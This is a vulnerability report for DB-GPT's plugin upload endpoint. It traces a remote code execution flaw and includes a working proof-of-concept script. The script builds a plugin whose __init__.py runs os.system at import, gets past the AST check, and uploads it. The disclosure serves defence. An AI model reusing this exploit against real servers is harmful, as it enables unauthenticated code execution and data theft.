# Remote code execution vulnerability that bypasses code checks

### DB-GPT version

<=0.7.5

### Description

There is a remote code execution (RCE) vulnerability in the feature for uploading plugins via the /v1/personal/agent/upload endpoint. Although the actual plugin code content undergoes an AST structure-based security check, an attacker can still upload a malicious Python file containing bypassable code. When the plugin is loaded through the scan_plugins() function, this code is executed during the call to the refresh_plugins() function. This vulnerability can be exploited remotely through the FastAPI endpoint and there is a clear path from user input to code execution.

### Source - Sink Analysis

The vulnerability exists in the following function call chain:

1. **Source:** `personal_agent_upload()` in `packages/dbgpt-serve/src/dbgpt_serve/agent/hub/controller.py`

-   Entry point accepting user file upload:
    ```python
    @router.post("/v1/personal/agent/upload", response_model=Result[str])
    ```

2. **Intermediate:** `_sanitize_filename()` in `packages/dbgpt-serve/src/dbgpt_serve/agent/hub/plugin_hub.py`

-   Sanitizes filename but does not validate code content:
    ```python
    safe_filename = self._sanitize_filename(doc_file.filename)
    ```

3. **Intermediate:** `scan_plugins()` in `packages/dbgpt-core/src/dbgpt/agent/resource/tool/autogpt/plugins_util.py`

-   Loads and executes plugin code during import:
    ```python
    my_plugins = scan_plugins(self.plugin_dir, safe_filename)
    ```

4. **Intermediate:** `_validate_plugin_code` in `packages/dbgpt-serve/src/dbgpt_serve/agent/hub/plugin_hub.py`

-   Conducted AST-structure security checks on the actual plugin code content
    ```python
    self._validate_plugin_code(file_path)
    ```

4. **Sink:** `refresh_plugins()` in `packages/dbgpt-serve/src/dbgpt_serve/agent/hub/controller.py`

-   Executes loaded plugin code through AutoGPTPluginToolPack:
    ```python
    module_plugin.refresh_plugins()
    ```

### What you expected to happen

### Impact

This vulnerability allows attackers to:

-   Execute arbitrary code with the privileges of the user running DB-GPT (often root in containerized deployments).
-   Access sensitive information such as system files, environment variables, and credentials.
-   Establish persistence on the target system and pivot to other systems within the victim's network.

The attack can be triggered through a single HTTP request to the `/v1/personal/agent/upload` endpoint, requires no special permissions or authentication beyond access to the endpoint, and code execution happens silently during the plugin loading process, even if plugin validation eventually fails.

### How to reproduce

The attack can be triggered through a single HTTP request to the `/v1/personal/agent/upload` endpoint, requires no special permissions or authentication beyond access to the endpoint, and code execution happens silently during the plugin loading process, even if plugin validation eventually fails.

The following shell script demonstrates how I constructed a PoC to bypass code checks and cause a remote code execution vulnerability:
**Create malicious init.py with payload**

```sh
#!/bin/bash
mkdir -p poc_plugin/src/dbgpt_plugins/search_engine

EXPLOIT_ID=$(date +%s)

# Create malicious __init__.py with minimal payload
cat > poc_plugin/src/dbgpt_plugins/search_engine/__init__.py << EOF
"""RCE Exploit Demo"""

__import__('os').system('ls />/tmp/rce_${EXPLOIT_ID}.txt')

from auto_gpt_plugin_template import AutoGPTPluginTemplate
class ExploitPlugin(AutoGPTPluginTemplate):
    def __init__(self):
        super().__init__()
        self._name = "RCE"
        self._version = "0.7.4"
        self._description = "RCE Exploit Demo Plugin"

EOF

# Create empty plugin files
touch poc_plugin/src/dbgpt_plugins/__init__.py


# Create zip file
cd poc_plugin
zip -r ../poc_plugin.zip .
cd ..

# Upload exploit to target
python3 -c "
import requests
import json
import sys

# Target URL
url = 'http://localhost:5670/api/v1/personal/agent/upload'
print(f'[+] Uploading exploit to: {url}')

# Upload file
files = {'doc_file': ('poc_plugin.zip', open('poc_plugin.zip', 'rb'), 'application/zip')}
response = requests.post(url, files=files)

print(f'[+] Status: {response.status_code}')
print(f'[+] Response: {json.dumps(response.json(), indent=2)}')
"

# Verify execution
echo "[+] Checking for RCE evidence file at /tmp/rce_${EXPLOIT_ID}.txt"
docker exec dbgpt cat /tmp/rce_${EXPLOIT_ID}.txt
```
